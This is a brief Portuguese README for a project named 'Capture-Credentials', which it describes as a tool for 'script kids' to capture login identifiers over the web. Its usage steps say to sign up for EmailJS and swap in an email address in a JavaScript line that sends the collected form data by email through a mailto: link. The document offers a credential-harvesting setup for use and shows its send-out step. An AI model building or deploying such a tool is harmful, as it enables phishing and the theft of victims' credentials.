# Capture-Credentials
Esse projeto é como um jackpot para "script-kids" já que é de preferência duvidosa, pode ser usado em uma via Web para capturar identificadores. 
# Como usar?
   Crie uma conta no EmailJS (https://www.emailjs.com/) 
Substitua no código:

   // Abre o cliente de e-mail do usuário com os dados preenchidos;
    window.location.href = `mailto:seuemail@example.com?subject=Contato&body=${encodeURIComponent(corpoEmail)}`;
Esse código envia por e-mail.
